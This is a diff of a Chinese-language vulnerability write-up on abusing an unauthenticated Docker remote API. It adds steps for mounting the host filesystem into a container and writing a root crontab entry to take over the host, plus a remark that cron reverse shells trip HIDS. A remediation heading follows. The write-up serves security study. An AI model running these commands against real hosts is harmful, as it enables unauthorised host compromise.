@@ -9,8 +9,17 @@ remote api默认是可以不需要认证能直接访问，能直接对docker进�
 docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
 ```
 
-写crontab或写.ssh秘钥获取宿主权限
+写crontab或写.ssh秘钥获取宿主权限(crontab反弹shell会被HIDS抓到)
 ![img.png](img.png)
+
+```
+cd /mnt/var/spool/cron
+echo '* * * * * whoami' >> root
+```
+![img_3.png](img_3.png)
+
+
+![img_2.png](img_2.png)
 
 ### 三 漏洞修复
 限制本机访问
